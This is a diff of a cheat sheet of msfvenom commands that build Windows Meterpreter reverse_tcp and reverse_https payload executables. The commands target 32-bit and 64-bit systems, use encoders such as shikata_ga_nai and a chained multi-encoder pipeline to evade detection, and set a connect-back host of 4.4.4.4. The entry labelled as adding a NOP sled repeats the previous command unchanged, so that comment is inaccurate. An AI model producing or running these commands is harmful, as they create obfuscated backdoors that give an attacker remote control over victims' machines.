@@ -1,18 +1,29 @@
-###
+#####
+#
 # Generic 32-bit
 msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 5 -f exe > /root/location/file.exe
+#
 # with connect back info
 msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=4.4.4.4 LPORT=80 -e x86/shikata_ga_nai -b '\x00' -i 5 -f exe > /root/location/file.exe
+#
 # add in a NOPsled
 msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=4.4.4.4 LPORT=80 -e x86/shikata_ga_nai -b '\x00' -i 5 -f exe > /root/location/file.exe
+#
 # Try a different encoder
 msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_https LHOST=4.4.4.4 LPORT=443 -b '\x00' -e cmd/powershell_base64 -i 3 -f exe > /root/location/file.exe
+#
+# Multi Encode
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_https LHOST=4.4.4.4 LPORT=443 -b '\x00' -e cmd/echo -i 1 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 5 -n 3 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 3 -f exe -o /root/location/file.exe
 
 
+#####
+#####
 
 
-###
+#####
+#
 # Generic 64-bit
 msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 5 -f exe > /root/location/file.exe
+#
 # with connect back info
 msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp LHOST=4.4.4.4 LPORT=80 -e x86/shikata_ga_nai -b '\x00' -i 5 -f exe > /root/location/file.exe
